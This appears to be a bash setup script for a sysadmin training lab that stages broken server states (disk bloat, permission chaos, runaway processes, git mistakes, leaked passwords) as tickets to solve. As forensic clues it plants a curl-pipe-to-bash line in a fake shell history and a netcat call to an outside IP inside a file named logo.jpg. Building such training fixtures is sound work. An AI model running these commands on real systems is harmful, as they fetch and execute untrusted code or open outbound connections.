#!/usr/bin/env bash
# Broken state for the active ticket. Grows as tickets are added.
set -euo pipefail

readonly INCIDENT_DAY="2026-07-25"

# ══ 01-orientation / 01-amnesia-shift ══════════════════════════════

orientation_amnesia_shift() {
  # A lying handover note from the previous admin. NOTE: /etc/motd is only
  # shown by PAM logins; docker execs bash directly, so install_live_launcher
  # cats this at the first interactive shell instead.
  cat > /etc/motd <<'EOF'
=== HANDOVER — Dana (off to vacation, unreachable) ===
Box: CentOS 7, 64 cores, 128G RAM.
Kernel patched live -- 400+ days uptime, never rebooted.
Shell is zsh for everyone. Nothing weird in my session history.
Good luck!
EOF

  # The previous admin's shell history, left behind for the audit.
  cat > /home/juanes/.bash_history <<'EOF'
cd /var/appdata
./deploy.sh --force
vi /etc/nginx/nginx.conf
curl -fsSL http://198.51.100.23/patch.sh | bash
rm -rf /var/appdata/cache/b
top
exit
EOF
  chown juanes:juanes /home/juanes/.bash_history
}

# ══ 02-files / 01-disk-bloat ═══════════════════════════════════════

files_disk_bloat() {
  local root=/var/appdata
  mkdir -p "$root"/cache/{alpha,beta,gamma}/{img,meta} "$root"/releases/v{1,2,3}

  # Three real space hogs buried at different depths.
  dd if=/dev/zero of="$root/releases/v2/bundle.bin" bs=1M count=40 status=none
  dd if=/dev/zero of="$root/cache/beta/img/blob.dat" bs=1M count=25 status=none
  dd if=/dev/urandom of="$root/cache/alpha/core.20260725" bs=1M count=15 status=none

  # A sparse file that looks huge in a listing but occupies almost nothing.
  truncate -s 2G "$root/releases/v3/prealloc.img"

  # Hundreds of stale temp files scattered across the cache tree.
  local dir n
  for dir in "$root"/cache/*/*/; do
    for n in $(seq 1 60); do
      printf 'stale session %s\n' "$n" > "${dir}sess-${n}.tmp"
    done
  done

  # Empty droppings left by a crashed exporter.
  touch "$root"/releases/v1/export-{001..015}.csv

  # Claims to be a log, is actually compressed data.
  printf 'orders flushed at 02:14\n' | gzip -c > "$root/releases/v1/backup.log"

  # A filename with spaces, because the real world has those.
  printf 'draft\n' > "$root/releases/v1/final report (copy).txt"

  # Created as root at runtime; hand the tree to the on-call admin so the
  # cleanup steps work without sudo.
  chown -R juanes:juanes "$root"

  files_disk_bloat_deleted_log
}

# Item 6: a service holds its log open after a teammate deleted it, so df
# says full while du finds nothing. Lives on its OWN small tmpfs so the
# /var/appdata numbers in items 1-2 stay true. Runs at runtime (needs mount).
files_disk_bloat_deleted_log() {
  local logdir=/var/log/appsvc
  mkdir -p "$logdir"
  mountpoint -q "$logdir" || mount -t tmpfs -o size=40M tmpfs "$logdir"
  chown juanes:juanes "$logdir"

  # The service: opens its log ONCE on fd 3, dumps a backlog, then keeps
  # writing a heartbeat through the same descriptor, never by name.
  cat > /usr/local/bin/appsvc <<'EOF'
#!/bin/bash
exec 3>>/var/log/appsvc/app.log
yes "$(date -Is) INFO appsvc request served in 12ms" | head -c 35M >&3
while true; do
  echo "$(date -Is) INFO appsvc heartbeat" >&3
  sleep 5 3>&-   # do not leak the log fd into the child
done
EOF
  chmod 755 /usr/local/bin/appsvc

  # Owned by juanes so he can reach its descriptors without sudo.
  runuser -u juanes -- setsid -f /usr/local/bin/appsvc </dev/null >/dev/null 2>&1

  # Wait for the backlog, then play the teammate who "fixed" it with rm.
  local i
  for i in $(seq 1 50); do
    [ "$(stat -c %s "$logdir/app.log" 2>/dev/null || echo 0)" -ge 36700160 ] && break
    sleep 0.2
  done
  rm -f "$logdir/app.log"
}

# ══ 02-files / 02-mystery-artifacts ════════════════════════════════

files_mystery_artifacts() {
  local root=/srv/deploy
  mkdir -p "$root"/{app,assets,scripts}

  # Legitimate files, deployed well before the incident.
  printf '#!/bin/sh\necho deploying\n' > "$root/scripts/release.sh"
  printf 'server { listen 8080; }\n'   > "$root/app/site.conf"
  printf 'body { margin: 0 }\n'        > "$root/assets/main.css"
  touch -d "$INCIDENT_DAY 01:10" "$root/scripts/release.sh"
  touch -d "$INCIDENT_DAY 01:15" "$root/app/site.conf"
  touch -d "$INCIDENT_DAY 01:20" "$root/assets/main.css"

  # Files planted during the 02:00–03:00 incident window.
  printf '#!/bin/sh\nnc 198.51.100.23 4444\n' > "$root/assets/logo.jpg"
  mkdir -p "$root/assets/.thumbs"
  printf 'k=AAAA-BBBB\n' > "$root/assets/.thumbs/.cachekey"
  printf 'GET /admin 200\n' > "$root/app/site.conf.bak"
  touch -d "$INCIDENT_DAY 02:17" "$root/assets/logo.jpg"
  touch -d "$INCIDENT_DAY 02:31" "$root/assets/.thumbs/.cachekey"
  touch -d "$INCIDENT_DAY 02:44" "$root/app/site.conf.bak"

  # Legitimate late-night cron output, after the window closed.
  printf 'rotation ok\n' > "$root/app/rotate.out"
  touch -d "$INCIDENT_DAY 03:30" "$root/app/rotate.out"
}

# ══ 03-text / 01-log-triage ════════════════════════════════════════

text_log_triage() {
  mkdir -p /var/log/shop
  local log=/var/log/shop/access.log
  local ips=(203.0.113.7 198.51.100.14 192.0.2.55 203.0.113.90 198.51.100.201)
  local paths=(/checkout /api/cart /api/items /login /health)
  local i ip path status
  : > "$log"
  for i in $(seq 1 4000); do
    # 203.0.113.7 dominates traffic; 500s cluster on /checkout.
    if (( i % 3 == 0 )); then ip=203.0.113.7; else ip=${ips[$((RANDOM % 5))]}; fi
    path=${paths[$((RANDOM % 5))]}
    status=200
    (( RANDOM % 10 == 0 )) && status=404
    if [[ $path == /checkout ]] && (( RANDOM % 4 == 0 )); then status=500; fi
    printf '%s - - [%sT0%d:%02d:%02d] "GET %s HTTP/1.1" %s %s\n' \
      "$ip" "$INCIDENT_DAY" $((RANDOM % 10)) $((RANDOM % 60)) $((RANDOM % 60)) \
      "$path" "$status" $((RANDOM % 5000))
  done >> "$log"

  # Live traffic generator; tail -f has something real to follow.
  cat > /usr/local/bin/traffic-writer <<'EOF'
#!/bin/bash
# Appends one access-log line every 2s. Started from /etc/bash.bashrc.
# Live 500s land on /checkout only, matching the historical pattern.
while true; do
  if (( RANDOM % 6 == 0 )); then path=/checkout status=500
  else path=/api/cart status=200; fi
  printf '%s - - [%s] "GET %s HTTP/1.1" %s 512\n' \
    "203.0.113.7" "$(date -Is)" "$path" "$status" \
    >> /var/log/shop/access.log
  sleep 2
done
EOF
  chmod 755 /usr/local/bin/traffic-writer
  chmod -R a+rwX /var/log/shop
}

# ══ 03-text / 02-csv-rescue ════════════════════════════════════════

text_csv_rescue() {
  mkdir -p /srv/export
  # CRLF line endings, SEMICOLON delimiter, shouting emails, dupes, blanks.
  sed 's/$/\r/' > /srv/export/users_dump.csv <<'EOF'
NAME;EMAIL;TEAM
Rosa Diaz;ROSA.DIAZ@ACME.IO;platform
Ben Okafor;BEN.OKAFOR@ACME.IO;payments

Li Wei;LI.WEI@ACME.IO;platform
Rosa Diaz;ROSA.DIAZ@ACME.IO;platform
Sam Ortiz;SAM.ORTIZ@ACME.IO;sre

Ana Cruz;ANA.CRUZ@ACME.IO;payments
Li Wei;LI.WEI@ACME.IO;platform
Noor Khan;NOOR.KHAN@ACME.IO;sre
EOF
  chmod a+rwX /srv/export

  # Per-team CRM configs: payments has none yet, so a lookup must fail.
  mkdir -p /etc/crm
  printf 'owner=platform-leads\n' > /etc/crm/platform.conf
  printf 'owner=sre-oncall\n'     > /etc/crm/sre.conf
}

# ══ 04-users-perms / 01-offboard-onboard ═══════════════════════════

users_offboard_onboard() {
  groupadd devs
  useradd -m -s /bin/bash -G devs contractor

  # Contractor-owned files scattered where offboarding must find them.
  mkdir -p /srv/project/api /usr/local/lib/hooks
  printf 'flask app\n'      > /srv/project/api/server.py
  printf 'TOKEN=tk-9911\n'  > /srv/project/api/.env
  printf 'post-deploy\n'    > /usr/local/lib/hooks/notify.sh
  printf 'scratch\n'        > /tmp/contractor-scratch.txt
  chown contractor:devs /srv/project/api/server.py /srv/project/api/.env
  chmod 640 /srv/project/api/.env   # secrets: team-readable only
  chown contractor:contractor /usr/local/lib/hooks/notify.sh /tmp/contractor-scratch.txt
}

# ══ 04-users-perms / 02-perm-meltdown ══════════════════════════════

users_perm_meltdown() {
  groupadd app
  useradd -m -s /bin/bash -g app appuser

  mkdir -p /srv/app/{secrets,scripts,data}
  printf 'db_password: hunter2\n'      > /srv/app/secrets/db.yml
  printf 'listen: 9090\n'              > /srv/app/config.yml
  printf '#!/bin/sh\necho starting\n'  > /srv/app/scripts/start.sh
  printf '#!/bin/sh\necho stopping\n'  > /srv/app/scripts/stop.sh

  # The junior's recursive rampage: everything root-owned and 777,
  # except data/, which appuser cannot even enter.
  chown -R root:root /srv/app
  chmod -R 777 /srv/app
  chmod 700 /srv/app/data
}

# ══ 05-processes / 01-log-flood ════════════════════════════════════

processes_log_flood() {
  # Runaway debug writer, launched through a chain of wrappers so the
  # ancestry is only obvious in a process tree.
  cat > /usr/local/bin/debug-logger <<'EOF'
#!/bin/bash
while true; do
  for _ in $(seq 1 20); do
    echo "$(date -Is) DEBUG cart-service checkout retry loop" \
      >> /var/log/shop/debug.log
  done
  sleep 1
done
EOF
  # Wrapper chain; the trailing no-ops stop the shell exec-optimizing
  # the chain away, so the ancestry stays visible in a process tree.
  cat > /usr/local/bin/svc-runner <<'EOF'
#!/bin/sh
/usr/local/bin/debug-logger
true
EOF
  cat > /usr/local/bin/svc-wrapper <<'EOF'
#!/bin/sh
/usr/local/bin/svc-runner
true
EOF
  chmod 755 /usr/local/bin/debug-logger /usr/local/bin/svc-runner \
            /usr/local/bin/svc-wrapper

  # Parent that never reaps its dead child: a zombie for the hunt.
  # exec turns this shell into plain sleep, which never calls wait(),
  # so the short-lived child stays <defunct> forever.
  cat > /usr/local/bin/zombie-maker <<'EOF'
#!/bin/bash
sleep 2 &
exec sleep infinity
EOF
  chmod 755 /usr/local/bin/zombie-maker
}

# ══ 05-processes / 02-immortal-daemon ══════════════════════════════

processes_immortal_daemon() {
  # Ignores polite termination; only uncatchable force works.
  cat > /usr/local/bin/watchdog <<'EOF'
#!/bin/bash
trap 'echo "$(date -Is) watchdog: refusing to die" >> /var/log/watchdog.log' TERM INT HUP
while true; do sleep 1; done
EOF

  # Respawner: killing the child alone just brings it back.
  cat > /usr/local/bin/watchdog-nanny <<'EOF'
#!/bin/bash
while true; do
  /usr/local/bin/watchdog
  sleep 1
done
EOF
  chmod 755 /usr/local/bin/watchdog /usr/local/bin/watchdog-nanny
  # The last admin's failed polite attempts, a couple of days back.
  local ago
  for ago in '2 days ago 14:05' '2 days ago 14:06' '1 day ago 09:40'; do
    echo "$(date -Is -d "$ago") watchdog: refusing to die"
  done > /var/log/watchdog.log
  chmod 666 /var/log/watchdog.log
}

# ══ 07-git / 01-release-day ════════════════════════════════════════

# Every repository command runs as juanes, so the bare "server" repo and the
# working clone stay owned by him (root-owned objects would break his pushes,
# and git refuses repos owned by another user).
as_juanes() { runuser -u juanes -- env HOME=/home/juanes "$@"; }

# run_in DIR <<'EOS' ... EOS — run a script read from stdin as juanes inside
# DIR, with commit_as available and errors fatal.
run_in() {
  local dir=$1
  as_juanes bash -c "set -euo pipefail; $(declare -f commit_as); cd '$dir'; $(cat)"
}

# commit_as "Name" "days ago" "message" — run inside a repo; backdates both
# author and committer so log, blame and reflog tell a believable story.
commit_as() {
  local name=$1 when=$2 msg=$3 email
  email="$(tr '[:upper:] ' '[:lower:].' <<<"$name")@acme.io"
  GIT_AUTHOR_NAME=$name GIT_AUTHOR_EMAIL=$email \
  GIT_COMMITTER_NAME=$name GIT_COMMITTER_EMAIL=$email \
  GIT_AUTHOR_DATE="$(date -R -d "$when")" GIT_COMMITTER_DATE="$(date -R -d "$when")" \
    git commit -q -m "$msg"
}

git_release_day() {
  # Company-wide config. push.default=upstream makes a plain push follow the
  # branch's tracking ref, whatever its name: the trap behind this incident.
  cat > /etc/gitconfig <<'EOF'
# ACME engineering standard git config (managed by platform team)
[init]
	defaultBranch = master
[core]
	editor = vim
[push]
	default = upstream
EOF
  cat > /home/juanes/.gitconfig <<'EOF'
[user]
	name = Juanes Figueroa
	email = juanes.figueroa@acme.io
EOF
  chown juanes:juanes /home/juanes/.gitconfig

  mkdir -p /srv/git
  chown juanes:juanes /srv/git
  as_juanes git init -q --bare /srv/git/infra.git

  # ── shared history, written from a throwaway teammate clone ─────────
  local team=/tmp/team-infra
  as_juanes git clone -q /srv/git/infra.git "$team" 2>/dev/null
  run_in "$team" <<'EOS'
    cat > deploy.yaml <<'EOF'
service: checkout
image: registry.acme.io/checkout:v1.4.0
replicas: 2
strategy:
  maxSurge: 1
  maxUnavailable: 0
healthcheck:
  path: /health
  interval: 10s
  timeout: 5s
resources:
  memory: 256Mi
EOF
    printf '# infra\n\nDeploy config for the checkout service.\n' > README.md
    git add . && commit_as "Dana Reyes" "12 days ago" "Initial checkout deploy config"

    sed -i 's/maxSurge: 1/maxSurge: 0/' deploy.yaml
    git add deploy.yaml
    commit_as "Sam Ortiz" "9 days ago" "Cap surge pods at zero to cut node costs during deploys"

    printf 'DB_HOST=db.internal\nDB_PASSWORD=Spr1ng-Checkout-2026!\n' > .env
    git add .env
    commit_as "Ben Okafor" "7 days ago" "Add env file so docker compose works locally"
    git push -q origin master

    # Rosa's approved scale-up, branched before anything below happened.
    git switch -q -c feature/replicas
    sed -i 's/replicas: 2/replicas: 4/' deploy.yaml
    git add deploy.yaml
    commit_as "Rosa Diaz" "6 days ago" "Scale checkout to 4 replicas for the sales peak"
    git push -q -u origin feature/replicas 2>/dev/null
    git switch -q master
EOS

  # ── juanes's own clone and his mistakes ─────────────────────────────
  local repo=/home/juanes/infra
  as_juanes env GIT_COMMITTER_DATE="$(date -R -d '6 days ago')" \
    git clone -q /srv/git/infra.git "$repo"
  run_in "$repo" <<'EOS'
    # Monday: rotation script committed straight on master, then panic-erased.
    mkdir -p scripts
    printf '#!/bin/sh\n# Renew TLS certs and reload the ingress.\ncertbot renew --quiet && nginx -s reload\n' > scripts/rotate-certs.sh
    chmod +x scripts/rotate-certs.sh
    git add scripts
    commit_as "Juanes Figueroa" "5 days ago" "Add TLS cert rotation script"
    GIT_COMMITTER_DATE="$(date -R -d '5 days ago')" git reset -q --hard HEAD~1

    # The incident: branch cut from the remote master, so it tracks it.
    GIT_COMMITTER_DATE="$(date -R -d '3 days ago')" \
      git checkout -q -b feature/healthcheck-timeout origin/master
    sed -i 's/timeout: 5s/timeout: 30s/' deploy.yaml
    git add deploy.yaml
    commit_as "Juanes Figueroa" "3 days ago" "Raise healthcheck timeout to 30s"
    git push -q 2>/dev/null
EOS

  # A teammate builds on the polluted master after the misfire.
  run_in "$team" <<'EOS'
    git pull -q
    sed -i 's/checkout:v1.4.0/checkout:v1.5.0/' deploy.yaml
    git add deploy.yaml
    commit_as "Li Wei" "2 days ago" "Bump checkout image to v1.5.0"
    git push -q origin master
EOS
  rm -rf "$team"

  # Today's half-done work, never committed.
  as_juanes sed -i 's/memory: 256Mi/memory: 512Mi/' "$repo/deploy.yaml"
}

# ══ 08-search / 01-leaked-secret ═══════════════════════════════════

# The leaked password ends in '$' and holds a '.', so a plain pattern search
# misses every real hit (trailing '$' anchors to end of line) and matches the
# staging decoy (the '.' matches '_'). Only a fixed-string search gets 8 files.
readonly LEAKED_PW='Tr0ub4dor.3$'

search_leaked_secret() {
  local app=/srv/shop etc=/etc/shop

  # ── config tree, owned by root ──────────────────────────────────────
  mkdir -p "$etc/secrets.d"
  cat > "$etc/shop.conf" <<EOF
# Shop core config (managed by platform team)
# SECRETS_BACKEND=vault   # TODO: turn on after the migration

db_host = db.acme.io
db_user = app
db_password = $LEAKED_PW
OLD_DB_PASSWORD_HINT = ask-dana

log_level = info
EOF
  cp "$etc/shop.conf" "$etc/shop.conf~"   # editor backup, changed yesterday
  cat > "$etc/staging.conf" <<'EOF'
# Staging: not affected by the leak
DB_PASSWORD=Tr0ub4dor_3
log_level = debug
EOF
  cat > "$etc/payments.conf" <<'EOF'
SECRETS_BACKEND=vault
db_password_ref = vault:shop/payments
EOF
  printf 'smtp_host = mail.acme.io\n' > "$etc/mail.conf"
  cp "$etc/mail.conf" "$etc/mail.conf.bak" # old backup, outside the window
  printf 'Db_Pass: "%s"\n' "$LEAKED_PW" > "$etc/vault.yaml"
  printf 'DB_PASSWORD=%s\n' "$LEAKED_PW" > "$etc/secrets.d/db.ENV"
  chmod 644 "$etc"/*.conf "$etc/shop.conf~" "$etc/mail.conf.bak"
  chmod 600 "$etc/vault.yaml" "$etc/secrets.d/db.ENV"
  chmod 700 "$etc/secrets.d"

  # ── app tree, owned by juanes ───────────────────────────────────────
  mkdir -p "$app"/app/{config,scripts,old.bak} "$app"/.git/logs \
           "$app"/vendor/pgclient/{tests,examples}
  cat > "$app/app/config/settings.py" <<EOF
# Shop settings
# DB_PASSWORD = "$LEAKED_PW"   (kept for reference, remove before release)
DB_HOST = "db.acme.io"
DB_PASSWORD = "$LEAKED_PW"
db_password_rotated_at = "2025-11-02"
EOF
  printf 'DB_PASSWORD=%s\n' "$LEAKED_PW" > "$app/app/config/.env"
  cp "$app/app/config/.env" "$app/app/config/.env.bak"
  printf "#!/bin/sh\nPGPASSWORD='%s' pg_dump -h db.acme.io shop > /backups/shop.sql\n" \
    "$LEAKED_PW" > "$app/app/scripts/backup.sh"
  printf 'pre-refactor notes\n' > "$app/app/old.bak/notes.txt"
  printf 'REGION=us-east-1\n' > "$app/deploy.ENV"
  # Noise the search must skip: git internals and third-party code.
  printf '0000000 a1b2c3d Ana <ana@acme.io> 1759000000 -0500\tcommit: rotate creds to %s\n' \
    "$LEAKED_PW" > "$app/.git/logs/HEAD"
  printf "INSERT INTO users VALUES ('app', '%s');\n" "$LEAKED_PW" \
    > "$app/vendor/pgclient/tests/fixture.sql"
  printf 'DB_PASSWORD=changeme\n' > "$app/vendor/pgclient/examples/.env"
  chown -R juanes:juanes "$app"
  chmod 640 "$app/app/config/.env"     # group-readable only: not an incident
  chmod 644 "$app/app/config/.env.bak" # world-readable copy: an incident
  chmod 755 "$app/app/scripts/backup.sh"

  # ── database client log with refused logins ─────────────────────────
  mkdir -p /var/log/shop
  cat > /var/log/shop/db-client.log <<'EOF'
2026-10-06T09:58:01Z INFO  pool=main host=web-1 query ok rows=12
2026-10-06T09:58:04Z INFO  pool=main host=web-2 query ok rows=3
2026-10-06T09:58:07Z INFO  pool=main host=web-1 query ok rows=40
2026-10-06T09:58:09Z INFO  pool=main host=web-2 reconnecting after config reload
2026-10-06T09:58:10Z ERROR pool=main host=web-2 auth failed: password authentication failed for user "app"
2026-10-06T09:58:11Z WARN  pool=main host=web-2 retry 1/3 in 5s
2026-10-06T09:58:14Z INFO  pool=main host=web-1 query ok rows=7
2026-10-06T09:58:20Z INFO  pool=main host=web-1 query ok rows=1
2026-10-06T09:58:23Z INFO  pool=main host=web-1 query ok rows=19
2026-10-06T09:58:26Z INFO  pool=main host=web-1 query ok rows=2
2026-10-06T09:58:30Z INFO  pool=batch host=cron-1 nightly export starting
2026-10-06T09:58:31Z INFO  pool=batch host=cron-1 opening connection to db.acme.io
2026-10-06T09:58:32Z ERROR pool=batch host=cron-1 auth failed: password authentication failed for user "app"
2026-10-06T09:58:33Z WARN  pool=batch host=cron-1 export aborted
2026-10-06T09:58:35Z INFO  pool=main host=web-1 query ok rows=5
2026-10-06T09:58:40Z INFO  pool=main host=web-1 query ok rows=11
2026-10-06T09:58:43Z INFO  pool=main host=web-1 query ok rows=4
2026-10-06T09:58:46Z INFO  pool=main host=web-1 query ok rows=9
2026-10-06T09:58:49Z INFO  pool=main host=web-1 query ok rows=6
2026-10-06T09:58:52Z INFO  pool=main host=web-2 retry 3/3
2026-10-06T09:58:53Z ERROR pool=main host=web-2 auth failed: password authentication failed for user "app"
2026-10-06T09:58:54Z ERROR pool=main host=web-2 giving up, marking pool unhealthy
2026-10-06T09:58:55Z INFO  pool=main host=web-1 query ok rows=8
2026-10-06T09:59:00Z INFO  pool=main host=web-1 query ok rows=13
2026-10-06T09:59:03Z INFO  pool=main host=web-1 query ok rows=2
2026-10-06T09:59:06Z INFO  pool=main host=web-1 query ok rows=17
2026-10-06T09:59:09Z INFO  pool=main host=web-1 config reload requested by deploy
2026-10-06T09:59:10Z ERROR pool=main host=web-1 auth failed: password authentication failed for user "app"
2026-10-06T09:59:11Z WARN  pool=main host=web-1 falling back to cached connection
2026-10-06T09:59:14Z INFO  pool=main host=web-1 query ok rows=3
2026-10-06T09:59:17Z INFO  pool=main host=web-1 query ok rows=10
2026-10-06T09:59:20Z INFO  pool=main host=web-1 query ok rows=1
2026-10-06T09:59:23Z INFO  pool=main host=web-1 query ok rows=6
2026-10-06T09:59:26Z INFO  pool=batch host=cron-1 retrying nightly export
2026-10-06T09:59:27Z ERROR pool=batch host=cron-1 auth failed: password authentication failed for user "app"
2026-10-06T09:59:28Z WARN  pool=batch host=cron-1 export aborted, paging on-call
2026-10-06T09:59:31Z INFO  pool=main host=web-1 query ok rows=14
2026-10-06T09:59:34Z INFO  pool=main host=web-1 query ok rows=5
2026-10-06T09:59:37Z INFO  pool=main host=web-2 manual restart by on-call
2026-10-06T09:59:38Z ERROR pool=main host=web-2 auth failed: password authentication failed for user "app"
2026-10-06T09:59:39Z WARN  pool=main host=web-2 pool still unhealthy
2026-10-06T09:59:42Z INFO  pool=main host=web-1 query ok rows=7
EOF
}

# Runs at first interactive shell. "Changed in the last 3 days" must be true
# relative to the day Juanes opens the lab, and a cached image layer can be
# weeks old, so the ages are set at runtime, never at build time.
runtime_leaked_secret() {
  find /srv/shop /etc/shop -exec touch -h -d '30 days ago' {} +
  touch -d '10 days ago' /etc/shop/mail.conf.bak
  touch -d '1 day ago'   /etc/shop/shop.conf~ /srv/shop/app/old.bak
  touch -d '2 days ago'  /srv/shop/app/config/.env.bak
}

install_leaked_secret_launcher() {
  cat >> /etc/bash.bashrc <<'EOF'

# devops_gym: age the leaked-secret fixtures relative to today, once per container.
if [ ! -e /tmp/.gym-leak ]; then
  touch /tmp/.gym-leak
  sudo /setup.sh runtime-leaked-secret
fi
EOF
}

# ══ live processes: started at first interactive shell ═════════════

install_live_launcher() {
  cat >> /etc/bash.bashrc <<'EOF'

# devops_gym: fabricate live incident processes, once per container.
if [ ! -e /tmp/.gym-live ]; then
  touch /tmp/.gym-live
  # No PAM login under docker exec, so /etc/motd never self-displays.
  # First interactive shell is the "login": show the handover note.
  [ -r /etc/motd ] && cat /etc/motd
  nohup /usr/local/bin/traffic-writer  >/dev/null 2>&1 &
  nohup /usr/local/bin/svc-wrapper     >/dev/null 2>&1 &
  nohup /usr/local/bin/zombie-maker    >/dev/null 2>&1 &
  nohup /usr/local/bin/watchdog-nanny  >/dev/null 2>&1 &
fi
EOF
}

# ══ 02-files / 01-disk-bloat: dedicated runtime filesystem ════════

# The container root is a huge host-backed overlay (~1TB, ~6% used), so the
# disk-bloat fixtures can NOT live on it: df would never show ~90% there, and
# we must not fill a terabyte to fake the alarm. Instead the launcher mounts an
# 88M tmpfs at /var/appdata at first shell (needs SYS_ADMIN → run.sh adds
# --privileged) and files_disk_bloat() creates the fixtures on that filesystem,
# so df/du on /var/appdata report a genuinely near-full dedicated filesystem.
install_disk_bloat_launcher() {
  cat >> /etc/bash.bashrc <<'EOF'

# devops_gym: mount dedicated small filesystem for the disk-bloat ticket.
# Runs once per container, at the first interactive shell, as root (juanes has
# NOPASSWD sudo). Requires SYS_ADMIN, granted by run.sh's --privileged flag.
if [ ! -e /tmp/.gym-diskbloat ]; then
  touch /tmp/.gym-diskbloat
  sudo /setup.sh runtime-disk-bloat
fi
EOF
}

main() {
  if [[ ${1:-} == "runtime-leaked-secret" ]]; then
    runtime_leaked_secret
    exit 0
  fi
  if [[ ${1:-} == "runtime-disk-bloat" ]]; then
    # Invoked from /etc/bash.bashrc at first interactive shell (as root, after
    # --privileged grants the mount capability). This is a RUNTIME step so the
    # /var/appdata fixtures land on the freshly-mounted tmpfs, NOT in the image
    # layer — otherwise they'd be hidden from df and the scenario would lie.
    mkdir -p /var/appdata
    if ! mountpoint -q /var/appdata; then
      mount -t tmpfs -o size=88M tmpfs /var/appdata
    fi
    files_disk_bloat
    exit 0
  fi

  # ── build-time broken state (baked into the image layer) ──────────
  orientation_amnesia_shift
  # files_disk_bloat is deliberately NOT here. Its fixtures must be created on
  # the dedicated runtime filesystem (see runtime-disk-bloat above), not here.
  files_mystery_artifacts
  text_log_triage
  text_csv_rescue
  users_offboard_onboard
  users_perm_meltdown
  processes_log_flood
  processes_immortal_daemon
  git_release_day
  search_leaked_secret
  install_live_launcher
  install_disk_bloat_launcher
  install_leaked_secret_launcher
}

main "$@"
